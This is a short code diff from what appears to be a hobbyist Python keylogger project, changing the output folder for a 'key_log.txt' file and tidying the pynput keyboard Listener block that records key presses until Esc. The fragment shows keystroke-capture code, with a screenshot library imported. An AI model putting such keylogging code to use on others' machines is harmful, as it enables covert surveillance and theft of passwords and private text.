@@ -29,7 +29,7 @@ from PIL import ImageGrab
 
 keys_information = "key_log.txt"
 
-file_path = "C:\\Users\\eeric\\Desktop"
+file_path = "C:\\Users\\eeric\\Desktop\\Py_Projects\\Keylogger\\output"
 extend = "\\"
 
 count = 0
@@ -60,11 +60,11 @@ def write_file(keys):
                 f.write(k)
                 f.close()
 
+
 def on_release(key):
     if key == Key.esc:
         return False
 
-with Listener(on_press=on_press, on_release=on_release) as listener:
-# with Listener(on_press(on_press), on_release(on_release)) as listener:
-    listener.join()
 
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
